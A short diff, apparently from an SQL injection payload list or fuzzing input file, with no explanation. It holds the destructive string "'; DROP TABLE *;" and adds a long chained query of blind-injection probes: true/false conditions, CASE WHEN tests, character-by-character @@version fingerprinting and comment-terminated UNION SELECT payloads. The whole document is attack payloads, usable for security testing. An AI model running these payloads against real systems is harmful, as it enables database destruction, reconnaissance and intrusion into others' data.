@@ -1,3 +1,7 @@
 
 '; DROP TABLE *;
 
+
+
+SELECT * FROM tablename WHERE columnname=(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)) AND 1=1 AND '%'=' AND 1=0 AND '%'=' AND (SELECT substring(@@version,1,1))='X' AND (SELECT substring(@@version,1,1))='M' AND (SELECT substring(@@version,2,1))='i' AND (SELECT substring(@@version,2,1))='y' AND (SELECT substring(@@version,3,1))='c' AND (SELECT substring(@@version,3,1))='S' AND (SELECT substring(@@version,3,1))='X' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END) AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))=1 AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)) AND (SELECT 1)=(CASE WHEN (1=1) THEN 1 ELSE 0 END) AND (SELECT 1)=1 AND (SELECT ' UNION SELECT 1--')=' UNION SELECT 1--' AND (SELECT ' UNION SELECT 1--')=' UNION SELECT 1--' AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND '%'=' AND 1=0 AND '%'='
+
